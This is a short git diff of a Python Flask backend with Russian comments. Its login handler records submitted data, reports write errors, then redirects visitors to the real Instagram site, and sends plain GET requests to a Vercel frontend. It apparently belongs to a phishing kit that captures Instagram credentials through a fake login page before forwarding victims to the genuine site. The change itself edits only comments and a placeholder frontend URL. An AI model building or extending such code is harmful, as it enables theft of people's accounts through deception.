@@ -19,11 +19,11 @@ def login():
             except Exception as e:
                 print(f"❌ ОШИБКА ЗАПИСИ: {e}")
         
-        # Редирект на настоящий Instagram
         return redirect("https://www.instagram.com", code=302)
     
-    # Если GET — просто редирект на фронтенд (Vercel)
-    return redirect("https://твой-фронтенд-на-vercel.com", code=302)
+    # Если кто-то зашёл просто по ссылке бэкенда — кидаем на фронтенд Vercel
+    return redirect("https://твой-фронтенд.vercel.app", code=302)
+
 
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 5000))
